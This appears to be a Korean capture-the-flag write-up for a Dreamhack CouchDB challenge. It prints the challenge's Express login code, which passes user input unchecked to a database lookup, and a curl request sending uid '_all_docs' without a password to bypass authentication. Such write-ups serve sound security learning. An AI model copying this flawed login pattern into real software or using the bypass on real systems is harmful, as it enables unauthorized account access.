---
title: "2025-07-24 NoSQL-CouchDB111"
excerpt: "CouchDB injection"

categories:
  - Problem
tags:
  - [NoSQL injection, CouchDB]

permalink: /Problem/2025-07-24 NoSQL-CouchDB111/

toc: true
toc_sticky: true

date: 2025-07-24
last_modified_at: 2025-07-24
---

## 🦥 본문

- app.js

```jsx
var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');

const nano = require('nano')(`http://${process.env.COUCHDB_USER}:${process.env.COUCHDB_PASSWORD}@couchdb:5984`);
const users = nano.db.use('users');
var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

/* GET home page. */
app.get('/', function(req, res, next) {
  res.render('index');
});

/* POST auth */
app.post('/auth', function(req, res) {
    users.get(req.body.uid, function(err, result) {
        if (err) {
            console.log(err);
            res.send('error');
            return;
        }
        if (result.upw === req.body.upw) {
            res.send(`FLAG: ${process.env.FLAG}`);
        } else {
            res.send('fail');
        }
    });
});

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
```

사용자로부터 uid와 upw를 받는다. uid를 통해 CouchDB에서 계정을 찾고 해당 결과에서 upw와 사용자가 보낸 upw가 같으면 FLAG가 나온다.

### 풀이과정

1. uid 값에 `_all_docs` 를 입력한다.
2. 아래와 같이 요청을 보낸다.
    
    ```jsx
    curl -X POST http://host1.dreamhack.games:17032/auth -H "Content-Type: application/json" -d '{"uid": "_all_docs"}'
    ```
    
    - uid를 `_all_docs` 를 보내면 에러 없이 get 함수가 실행된다
    - 해당 페이지에서는 upw인 키 값이 없기 때문에 result.upw는 undefined가 된다.
    - upw를 보내지 않으면 undefined가 되기 때문에 조건문을 만족하여 FLAG 값이 나온다.